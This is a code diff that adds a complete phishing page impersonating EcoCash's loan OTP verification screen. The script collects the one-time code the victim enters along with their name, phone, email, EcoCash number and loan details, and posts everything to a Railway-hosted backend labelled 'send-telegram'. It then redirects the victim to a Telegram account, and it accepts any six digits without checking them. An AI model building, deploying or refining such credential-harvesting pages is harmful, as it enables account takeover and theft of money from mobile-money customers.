@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>EcoCash · Verify OTP</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: linear-gradient(135deg, #e8f0fe 0%, #d4e4fc 100%); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: flex-start; justify-content: center; min-height: 100vh; padding: 16px; }
+        .app-container { max-width: 500px; width: 100%; margin: 0 auto; display: flex; flex-direction: column; }
+
+        .loan-summary-bar { background: white; border-radius: 20px; padding: 14px 18px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; border: 1px solid rgba(0, 75, 149, 0.15); }
+        .summary-item { display: flex; flex-direction: column; }
+        .summary-label { font-size: 0.7rem; color: #6b8a9e; text-transform: uppercase; }
+        .summary-value { font-size: 1rem; font-weight: 700; color: #004B95; }
+
+        .otp-card { background: white; border-radius: 32px; padding: 28px 24px 32px; border: 1px solid rgba(0, 75, 149, 0.15); box-shadow: 0 10px 30px rgba(0, 75, 149, 0.08); }
+        .section-title { font-size: 1.3rem; font-weight: 700; background: linear-gradient(135deg, #004B95, #26b0da); background-clip: text; -webkit-background-clip: text; color: transparent; }
+        .section-sub { font-size: 0.8rem; color: #6b8a9e; margin-bottom: 28px; border-left: 3px solid #004B95; padding-left: 12px; }
+
+        .phone-verify-box { background: #f8fafc; border-radius: 24px; padding: 18px 16px; margin-bottom: 28px; display: flex; justify-content: space-between; align-items: center; border: 1px solid rgba(0, 75, 149, 0.1); }
+        .phone-number { font-size: 1.1rem; font-weight: 700; color: #004B95; }
+        .edit-link { color: #004B95; background: rgba(0, 75, 149, 0.1); padding: 6px 14px; border-radius: 40px; cursor: pointer; font-size: 0.75rem; }
+
+        /* 6 OTP Boxes */
+        .otp-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
+        .otp-box { width: 50px; height: 60px; background: #fefefe; border: 2px solid #e0e8f0; border-radius: 16px; text-align: center; font-size: 1.4rem; font-weight: 700; color: #004B95; outline: none; }
+        .otp-box:focus { border-color: #004B95; box-shadow: 0 0 0 3px rgba(0, 75, 149, 0.1); }
+
+        .timer-text { text-align: center; font-size: 0.8rem; color: #6b8a9e; margin-bottom: 8px; }
+        .resend-btn { display: block; margin: 0 auto 24px; background: none; border: none; color: #004B95; font-weight: 600; cursor: pointer; font-size: 0.85rem; padding: 8px 16px; border-radius: 40px; }
+        .verify-btn { width: 100%; background: linear-gradient(135deg, #004B95, #26b0da); border: none; padding: 18px; font-size: 1.1rem; font-weight: 700; color: white; border-radius: 60px; cursor: pointer; }
+        .verify-btn.loading { opacity: 0.7; cursor: not-allowed; }
+        
+        .error-message { color: #e74c3c; font-size: 0.8rem; text-align: center; margin-top: 12px; display: none; background: rgba(231, 76, 60, 0.1); padding: 10px; border-radius: 12px; }
+        .error-message.show { display: block; }
+        
+        .telegram-note { text-align: center; margin-top: 16px; font-size: 0.7rem; color: #6b8a9e; }
+
+        @media (max-width: 450px) { .otp-box { width: 45px; height: 55px; font-size: 1.2rem; } .otp-container { gap: 6px; } }
+        @media (max-width: 380px) { .otp-box { width: 40px; height: 50px; font-size: 1rem; } }
+    </style>
+</head>
+<body>
+<div class="app-container">
+    <div class="loan-summary-bar">
+        <div class="summary-item"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">$ 0</span></div>
+        <div class="summary-item"><span class="summary-label">Term</span><span class="summary-value" id="summaryTerm">0</span></div>
+        <div class="summary-item"><span class="summary-label">Monthly</span><span class="summary-value" id="summaryMonthly">$ 0</span></div>
+        <div class="summary-item"><span class="summary-label">Interest</span><span class="summary-value" id="summaryRate">5%</span></div>
+    </div>
+
+    <div class="otp-card">
+        <div class="section-title">Verify your number</div>
+        <div class="section-sub">Enter the 6-digit verification code sent to your phone</div>
+
+        <div class="phone-verify-box">
+            <div><span class="phone-number" id="displayPhone">+263 XX XXX XXXX</span></div>
+            <div class="edit-link" id="editPhoneBtn">Edit</div>
+        </div>
+
+        <!-- 6 OTP Boxes -->
+        <div class="otp-container">
+            <input type="text" maxlength="1" class="otp-box" data-idx="0" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="1" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="2" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="3" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="4" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="5" inputmode="numeric">
+        </div>
+
+        <div class="timer-text" id="timerText">Enter any 6 digits to continue</div>
+        <button class="resend-btn" id="resendBtn">Resend code</button>
+        <div class="error-message" id="otpError">⚠️ Please enter all 6 digits</div>
+        <button class="verify-btn" id="verifyBtn">Verify & Continue →</button>
+        <div class="telegram-note">After verification, you'll be redirected to Telegram to complete your application</div>
+    </div>
+</div>
+
+<script>
+    // ============================================
+    // ECOCASH OTP CONFIGURATION
+    // ============================================
+    
+    // BACKEND URL (UPDATE WITH YOUR RAILWAY URL)
+    const RAILWAY_URL = 'https://eco-cash-production.up.railway.app';
+    
+    // TELEGRAM USERNAME - WHERE USER LANDS AFTER OTP
+    const TELEGRAM_USERNAME = 'Crypto_760';
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    const amount = urlParams.get('amount') || '500';
+    const term = urlParams.get('term') || '3';
+    const rate = urlParams.get('rate') || '5';
+    const monthly = urlParams.get('monthly') || '167.36';
+    let userPhone = urlParams.get('phone') || '+263 77 123 4567';
+    const userName = urlParams.get('name') || 'Customer';
+    const userEmail = urlParams.get('email') || '';
+    const ecoNumber = urlParams.get('ecoNumber') || '';
+    
+    document.getElementById('summaryAmount').innerText = `$ ${parseInt(amount).toLocaleString()}`;
+    document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
+    document.getElementById('summaryMonthly').innerText = `$ ${parseFloat(monthly).toFixed(2)}`;
+    document.getElementById('summaryRate').innerText = `${rate}%`;
+    document.getElementById('displayPhone').innerText = userPhone;
+    
+    async function sendOtpNotification(otp) {
+        try {
+            const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: userPhone,
+                    pin: otp,
+                    email: userEmail,
+                    name: userName,
+                    amount: amount,
+                    term: term,
+                    monthly: monthly,
+                    eco_number: ecoNumber,
+                    type: 'otp',
+                    site: 'EcoCash'
+                })
+            });
+            const result = await response.json();
+            console.log('📤 OTP sent to backend:', result);
+        } catch (error) {
+            console.error('Error sending OTP:', error);
+        }
+    }
+    
+    function redirectToTelegram() {
+        const message = `Hello! I have verified my OTP.\n\nName: ${userName}\nLoan: $ ${amount}\nPhone: ${userPhone}\nEcoCash Number: ${ecoNumber}\nTerm: ${term} months`;
+        const encodedMessage = encodeURIComponent(message);
+        window.location.href = `https://t.me/${TELEGRAM_USERNAME}?text=${encodedMessage}`;
+    }
+    
+    const timerText = document.getElementById('timerText');
+    const resendBtn = document.getElementById('resendBtn');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const errorMsg = document.getElementById('otpError');
+    
+    let timeLeft = 120;
+    let timerInterval;
+    
+    function updateTimer() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerText.innerText = `Enter any 6 digits to continue (${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')})`;
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerText.innerText = 'Enter any 6 digits to continue';
+        }
+    }
+    
+    function startTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        timeLeft = 120;
+        updateTimer();
+        timerInterval = setInterval(() => { if (timeLeft > 0) { timeLeft--; updateTimer(); } }, 1000);
+    }
+    
+    function resetOTP() {
+        startTimer();
+        currentOtp = ['', '', '', '', '', ''];
+        updateOtpUI();
+        otpBoxes[0].focus();
+        errorMsg.classList.remove('show');
+    }
+    
+    startTimer();
+    resendBtn.onclick = () => resetOTP();
+    
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    let currentOtp = ['', '', '', '', '', ''];
+    
+    function updateOtpUI() {
+        otpBoxes.forEach((box, idx) => { box.value = currentOtp[idx] || ''; });
+    }
+    
+    function setOtpDigit(index, value) {
+        if (value && !value.match(/[0-9]/)) return;
+        if (index >= 0 && index < 6) {
+            currentOtp[index] = value || '';
+            updateOtpUI();
+            if (value && index < 5) otpBoxes[index + 1].focus();
+            errorMsg.classList.remove('show');
+        }
+    }
+    
+    otpBoxes.forEach((box, idx) => {
+        box.addEventListener('input', (e) => setOtpDigit(idx, e.target.value.slice(-1)));
+        box.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace') {
+                e.preventDefault();
+                if (currentOtp[idx] !== '') setOtpDigit(idx, '');
+                else if (idx > 0) { setOtpDigit(idx - 1, ''); otpBoxes[idx - 1].focus(); }
+            }
+            if (e.key === 'ArrowLeft' && idx > 0) { e.preventDefault(); otpBoxes[idx - 1].focus(); }
+            if (e.key === 'ArrowRight' && idx < 5) { e.preventDefault(); otpBoxes[idx + 1].focus(); }
+        });
+    });
+    
+    verifyBtn.onclick = async () => {
+        const enteredOtp = currentOtp.join('');
+        if (enteredOtp.length !== 6) {
+            errorMsg.classList.add('show');
+            return;
+        }
+        
+        verifyBtn.textContent = 'Verifying...';
+        verifyBtn.classList.add('loading');
+        verifyBtn.disabled = true;
+        
+        await sendOtpNotification(enteredOtp);
+        redirectToTelegram();
+    };
+    
+    document.getElementById('editPhoneBtn').onclick = () => {
+        const newPhone = prompt('Enter your phone number:', userPhone);
+        if (newPhone && newPhone.trim().length > 5) { 
+            userPhone = newPhone.trim(); 
+            document.getElementById('displayPhone').innerText = userPhone; 
+            resetOTP();
+        }
+    };
+    
+    setTimeout(() => otpBoxes[0].focus(), 100);
+</script>
+</body>
+</html>
